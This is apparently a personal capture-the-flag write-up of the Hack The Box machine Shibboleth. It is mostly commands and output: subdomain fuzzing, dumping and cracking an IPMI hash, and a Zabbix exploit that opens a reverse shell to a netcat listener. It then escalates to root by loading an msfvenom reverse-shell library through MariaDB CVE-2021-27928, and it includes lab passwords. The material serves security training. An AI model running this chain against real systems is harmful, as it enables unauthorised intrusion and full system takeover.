#### port scan
only 80 is open
`└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://shibboleth.htb/' -H "HOST:FUZZ.shibboleth.htb" -t 100` -fw 18 
```
monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 2722ms]
zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 2821ms]
monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 2824ms]
:: Progress: [4989/4989] :: Job [1/1] :: 95 req/sec :: Duration: [0:01:09] :: Errors: 0 ::
```
a login page, zabbix

`└─$ nmap -sU 10.129.231.3 --min-rate 999`
```
623/udp   open   asf-rmcp
```

`└─$ ipmitool -I lanplus -C 0 -H 10.129.231.3 -U admin -P admin user list`
`Error: Unable to establish IPMI v2 / RMCP+ session`
``                                                                                                            
┌──(ed㉿kali)-[~]
└─$ ipmitool -I lanplus -C 0 -H 10.129.231.3 -U Administrator -P admin user list
ID  Name	     Callin  Link Auth	IPMI Msg   Channel Priv Limit
1                    true    false      false      USER
2   Administrator    true    false      true       USER
```
https://angelica.gitbook.io/hacktricks/network-services-pentesting/623-udp-ipmi
```
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes

msf auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.129.231.3
RHOSTS => 10.129.231.3
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > ruun
[-] Unknown command: ruun. Did you mean run? Run the help command for more details.
msf auxiliary(scanner/ipmi/ipmi_dumphashes) > run
[+] 10.129.231.3:623 - IPMI - Hash found: Administrator:3c03e029020800003e8b86cbdcf8a7944563330b0772a3c12405dac825b57b287988a9df83ec95eaa123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:364b1fe9752d8d56e2e850e483370edb63ae8ddf
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
7300 	IPMI2 RAKP HMAC-SHA1

`└─$ hashcat -m 7300 hash  ~/tools/rockyou.txt -a 0  `
creack it, and login to port 80 zabbix  ilovepumkinpie1

https://www.exploit-db.com/exploits/50816
```
└─$ python3 50816.py                                                                   
[*] this exploit is tested against Zabbix 5.0.17 only
[*] can reach the author @ https://hussienmisbah.github.io/
[!] usage : ./expoit.py <target url>  <username> <password> <attacker ip> <attacker port>
                                                                                                                     
┌──(ed㉿kali)-[~/Downloads]
└─$ python3 50816.py http://monitor.shibboleth.htb/ Administrator ilovepumkinpie1 10.10.17
 ```

get foothold
```
└─$ nc -nvlp 443 
listening on [any] 443 ...
connect to [10.10.17.165] from (UNKNOWN) [10.129.231.3] 50100
sh: 0: can't access tty; job control turned off
$ which python
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
zabbix@shibboleth:/$ 
```
`zabbix@shibboleth:/$ cat /etc/passwd | grep bash`
```
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
```
`$ su ipmi-svc`
```
Password: ilovepumkinpie1

id
uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
```

from linpeas
```
-rw-r----- 1 root ipmi-svc 21863 Apr 24  2021 /etc/zabbix/zabbix_server.conf
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
PidFile=/run/zabbix/zabbix_server.pid
SocketDir=/run/zabbix
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh
SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
FpingLocation=/usr/bin/fping
Fping6Location=/usr/bin/fping6
LogSlowQueries=3000
StatsAllowedIP=127.0.0.1
```
`ipmi-svc@shibboleth:/$ mysql -u zabbix -p`
```
mysql -u zabbix -p
Enter password: bloooarskybluh

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1416
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
```

https://github.com/Al1ex/CVE-2021-27928

msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf-so -o CVE-2021-27928.so
```
MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
ERROR 2013 (HY000): Lost connection to MySQL server during query
```
`└─$ nc -nvlp 8822   `
```                                                 
listening on [any] 8822 ...
connect to [10.10.17.165] from (UNKNOWN) [10.129.231.3] 59686
id
uid=0(root) gid=0(root) groups=0(root)
```

#### lesson learned
- when tcp port is less, try udp
- IPMI of udp
- mysql vuln  lead to ES
